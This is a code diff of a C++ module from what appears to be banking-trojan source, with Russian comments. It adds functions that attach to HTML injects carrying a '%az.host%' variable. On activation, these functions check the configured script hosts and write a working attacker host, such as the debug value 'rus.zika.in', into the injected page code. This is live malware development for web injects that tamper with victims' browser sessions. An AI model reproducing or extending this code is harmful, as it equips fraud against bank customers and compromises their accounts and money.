@@ -2,8 +2,6 @@
 #pragma hdrstop
 
 
-#include "BotDef.h"
-#include "BotConfig.h"
 #include "Modules.h"
 
 
@@ -13,9 +11,6 @@
 	//   используем отдельные настройки
 	//****************************************
 	#define USE_AZ_CONFIG
-#else
-
-    #include "AzConfig.h"
 
 #endif
 
@@ -24,39 +19,44 @@
 #include "Config.h"
 #include "Utils.h"
 #include "BotHosts.h"
+#include "BotDef.h"
+#include "BotConfig.h"
 //-----------------------------------------------------------------------------
 
 
 // Внутренние данные модуля
 namespace AZDATA
 {
-	DWORD PID = 0; // Идентификаор процесса в котором работает модуль
-    THostChecker *Checker = NULL; // Система проверки работоспособности хостов
+	DWORD PID = 0; 				  // Идентификаор процесса в котором работает модуль
+	THostChecker *Checker = NULL; // Система проверки работоспособности хостов
+
+    char Variable_ScriptHost[] = {'%','a','z','.','h','o','s','t','%', 0};;
 }
 
 
 
 #ifdef USE_AZ_CONFIG
 
+
+
+
 	char AZ_HOSTS[AZCONFIG_PARAM_SIZE_HOSTS] = AZCONFIG_PARAM_NAME_HOSTS;
 
 	#define AZ_HOSTS_HASH 0xE0203A42 /* __AZ_HOSTS__ */
 
-#endif
 
+	//*****************************************************************
+	//  Хосты, которые будут вшиваться в HTML инжекты
+	//*****************************************************************
+	#ifdef DEBUGCONFIG
+		// Отладочные данные
+		char AZ_SCRIPTS_HOSTS[] = "rus.zika.in\0";
+	#else
+		// Рабочий массив
+		char AZ_SCRIPTS_HOSTS[AZCONFIG_PARAM_SIZE_SCRIPTHOSTS] = AZCONFIG_PARAM_NAME_SCRIPTHOSTS;
+	#endif
 
-//*****************************************************************
-//  Хосты, которые будут вшиваться в HTML инжекты
-//*****************************************************************
-#ifdef DEBUGCONFIG
-    // Отладочные данные
-	char AZ_SCRIPTS_HOSTS[] = "rus.gipa.in\0\0";
-#else
-	// Рабочий массив
-	char AZ_SCRIPTS_HOSTS[AZCONFIG_PARAM_SIZE_SCRIPTHOSTS] = AZCONFIG_PARAM_NAME_SCRIPTHOSTS;
-#endif
-
-#define AZ_SCRIPTS_HOSTS_HASH 0x94D84D31 /* __AZ_SCRIPTS_HOSTS__ */
+	#define AZ_SCRIPTS_HOSTS_HASH 0x94D84D31 /* __AZ_SCRIPTS_HOSTS__ */
 
 
 
@@ -110,6 +110,23 @@ void AzInicializeHostChecker()
 }
 //-----------------------------------------------------------------------------
 
+void AZInjectActivated(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
+{
+	// Запуск процесса проверки хоста
+    AzCheckScriptHosts();
+}
+
+
+void AZInjectExecute(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
+{
+	// Устанавливаем значение хоста
+	TBotConfig* Config = Config::GetConfig();
+	if (Config && AZDATA::Checker)
+	{
+		string Host = AZDATA::Checker->GetWorkHost();
+		Config->HTMLInjects->Variables->SetValue(AZDATA::Variable_ScriptHost, Host);
+	}
+}
 
 void AZInjectsLoadedEvent(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
 {
@@ -123,8 +140,12 @@ void AZInjectsLoadedEvent(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam
 	for (int i = 0; i < Count; i++)
 	{
 		THTMLInject *Inject = Injects->Items(i);
-		if (Inject->ContainVariable(""))
-			return;
+		if (Inject->ContainVariable("%az.host%"))
+		{
+			// Подключаемся к инжекту в ожидании его активации
+			Inject->AttachEvent(BOT_EVENT_HTMLINJECT_ACTIVATED, AZInjectActivated);
+			Inject->AttachEvent(BOT_EVENT_HTMLINJECT_EXECUTE, AZInjectExecute);
+		}
 
 	}
 }
@@ -180,3 +201,10 @@ string AzGetScriptHost()
 	return AZDATA::Checker->GetWorkHost();
 }
 //-----------------------------------------------------------------------------
+
+
+
+
+
+//-----------------------------------------------------------------------------
+#endif
